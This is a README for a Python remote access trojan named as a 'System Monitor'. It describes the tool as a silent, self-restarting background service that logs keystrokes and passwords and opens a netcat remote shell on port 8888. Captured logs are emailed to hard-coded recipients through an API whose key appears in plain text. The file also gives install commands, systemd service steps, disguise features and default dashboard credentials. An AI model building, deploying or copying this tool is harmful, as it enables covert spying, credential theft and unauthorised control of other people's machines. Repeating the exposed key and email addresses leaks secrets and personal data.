# System Monitor Application

A cross-platform system monitoring application that runs silently as a background service, captures system logs, keystrokes, and sends them via email to configured recipients using SendLib API.

## 📧 Email Configuration (SendLib)

Uses SendLib API (https://sendlib.samueltuoyo.com/docs/send) for email delivery:
- **API Key**: `sl_4df4dc04_c9784a4c0773e336d5883c679b4ab6c7225344af70373b13feeb8842`
- **Sender**: `sedquizstar@gmail.com`
- **Default Recipient**: `ujiroduke1@gmail.com`

## Features

- 🖥️ **Cross-Platform** - Works on Linux, macOS, and Windows
- 🤫 **Silent Operation** - Runs as a background daemon/service
- 🔄 **Auto-Start** - Survives system reboots
- 📧 **Email Alerts** - Sends captured logs via SendLib API
- ⌨️ **Keylogger** - Captures keystrokes and passwords
- 🌐 **Web Dashboard** - Admin interface for management
- 🔑 **Remote Access** - Shell access to target device
- 👥 **Multi-Recipient** - Add multiple email recipients
- 🎭 **Disguised** - Runs as "System Monitor" not "RAT"

## Quick Start

### Installation

```bash
cd /home/dukeetheprogrammer/rat
chmod +x install.sh
./install.sh
```

### Manual Installation

```bash
# Install dependencies
pip3 install -r requirements.txt

# Initialize database
python3 -c "from rat_agent.database import init_db; init_db()"

# Run the agent
python3 rat_agent/agent.py
```

### Start Dashboard

```bash
cd dashboard
python3 app.py
```

Access at: `http://localhost:5000`

## Configuration

Edit `rat_agent/config.py` to customize:

```python
# Email Configuration
SENDLIB_API_KEY = "your_api_key"
SENDER_EMAIL = "sender@example.com"
DEFAULT_RECIPIENTS = ["recipient@example.com"]

# Dashboard
DASHBOARD_USERNAME = "admin"
DASHBOARD_PASSWORD = "your_password"

# Log Capture
LOG_CAPTURE_INTERVAL = 300  # seconds

# Remote Access
REMOTE_PORT = 8888
```

## Service Management (Linux)

```bash
# Start service
sudo systemctl start rat-agent

# Stop service
sudo systemctl stop rat-agent

# Check status
sudo systemctl status rat-agent

# View logs
sudo journalctl -u rat-agent -f

# Enable auto-start
sudo systemctl enable rat-agent
```

## Dashboard

Access the web dashboard at `http://<your-ip>/rat`

**Default Credentials:**
- Username: `admin`
- Password: `rat_admin_2024`

### Dashboard Features

- 📊 View system statistics
- 📧 Manage email recipients
- 📋 View captured logs
- 💻 System information
- ⌨️ Executed commands history
- ⚙️ Settings and cleanup

## Remote Access

Connect to the remote shell:

```bash
nc <target-ip> 8888
```

Available commands:
- `help` - Show available commands
- `sysinfo` - Show system information
- `clients` - Show connected clients
- `disconnect` - Close connection
- Any shell command (ls, cat, ps, etc.)

## File Structure

```
rat/
├── plan.md                    # Project plan
├── implementation.md          # Implementation guide
├── howitworks.md             # How it works documentation
├── README.md                 # This file
├── install.sh                # Installation script
├── requirements.txt          # Python dependencies
├── rat_agent/
│   ├── __init__.py
│   ├── agent.py             # Main RAT agent
│   ├── config.py            # Configuration
│   ├── database.py          # SQLite database
│   ├── emailer.py           # Email sending
│   ├── logger.py            # Log capture
│   └── remote.py            # Remote access
├── dashboard/
│   ├── app.py               # Flask application
│   └── templates/
│       ├── login.html
│       └── index.html
├── services/
│   └── rat-agent.service    # systemd service
└── nginx/
    └── rat.conf             # Nginx configuration
```

## Email Configuration

The RAT uses SendLib API for email delivery:

- **API URL**: `https://sendlib.samueltuoyo.com`
- **Sender**: `sedquizstar@gmail.com`
- **Default Recipient**: `ujiroduke1@gmail.com`

## Security

- Change default dashboard credentials
- Use HTTPS for dashboard (configure nginx with SSL)
- Store API keys securely
- Regular log cleanup

## Troubleshooting

### Service not starting

```bash
# Check service status
systemctl status rat-agent

# View logs
journalctl -u rat-agent -f

# Manual start for debugging
python3 rat_agent/agent.py
```

### Emails not sending

```bash
# Test email sending
python3 -c "
from rat_agent.emailer import EmailSender
emailer = EmailSender()
emailer.send_test_email('test@example.com')
"
```

### Dashboard not accessible

```bash
# Check if Flask is running
ps aux | grep flask

# Check nginx status
systemctl status nginx

# Test dashboard directly
curl http://127.0.0.1:5000
```

## License

MIT License

## Version

1.0.0
